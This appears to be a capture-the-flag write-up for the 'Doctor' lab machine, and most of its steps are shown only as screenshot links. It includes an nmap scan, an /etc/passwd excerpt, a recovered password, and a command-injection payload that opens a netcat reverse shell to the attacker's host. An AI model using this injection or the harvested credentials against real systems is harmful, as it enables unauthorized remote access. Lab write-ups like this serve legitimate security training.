# DOCTOR

![](../.gitbook/assets/7502ce5b83f54ce299d078d572d8562a.png)

## NMAP SCAN

```text
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (92%), Linux 5.0 - 5.4 (91%), Linux 5.3 - 5.4 (91%), Linux 2.6.32 (91%), Linux 5.0 (90%), Linux 5.0 - 5.3 (90%), Linux 5.4 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   32.16 ms 10.10.14.1
2   32.41 ms 10.10.10.209
```

## PORT 80 ENUMERATION

![](../.gitbook/assets/211aa9c2259942d7a4920fa414ebfcae.png)

* doctors.htb \(ADD TO YOUR HOSTS\)

![](../.gitbook/assets/4432a44aba5c455f837385ab696927f1.png)

![](../.gitbook/assets/0290ed51313a45c7b97abaa2f6ff6aaf.png)

![](../.gitbook/assets/56967dbec6604017b3738d6a87cf338c.png)

![](../.gitbook/assets/4f76907c993142b7875726cb1961f31f.png)

[https://sentrywhale.com/documentation/reverse-shell](https://sentrywhale.com/documentation/reverse-shell) 

![](../.gitbook/assets/4a23f388005a452d8861df890b28f136.png)

```text
<img src=http://10.10.14.17/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.14.17'$IFS'4445')>
```

![](../.gitbook/assets/cbbca4245ea5482cad935ec8ca6738d9.png)

![](../.gitbook/assets/b9f5a56e11e84d7798a9cdfd800f2781.png)

## MACHINE ENUMERATION

```text
root:x:0:0:root:/root:/bin/bash 
... 
shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash 
splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash
```

![](../.gitbook/assets/559bc0a6d60a463ea525e6afba6d0b3a.png)

![](../.gitbook/assets/fed740f88d6f4e6280d350b071cc7e6e.png)

## LATERAL MOVEMENT

![](../.gitbook/assets/099c06fc79f943b1a2dc72eaf8421450.png)

## PORT 8089 EXPLOIT

![](../.gitbook/assets/fa9a444b1c6d4b6b9c2b461836fec898.png)

![](../.gitbook/assets/844ef465b4db4bceadd9c159e011bac5.png)

![](../.gitbook/assets/0c84435029f84f7a946a14657adddb9f.png)

![](../.gitbook/assets/1fa90837e4a44441bc8fa393ece7f739.png)

## PRIVESC ROOT

![](../.gitbook/assets/b4933dc3bd5e46e484f83ecbabeefd26.png)

![](../.gitbook/assets/7f415ba9819d460abdbde806ee397ce6.png)

![](../.gitbook/assets/ef0d1da876cc4d198f5ab73a55e941fb.png)

![](../.gitbook/assets/811277874e1e4b5baf91759c8c220064.png)

![](../.gitbook/assets/40d3632525f84bbab1d5152cfbc5edb8.png)

## CREDS

```text
shaun:Guitar123
```

![](../.gitbook/assets/f32977a349284be88d518e76148423c6.png)

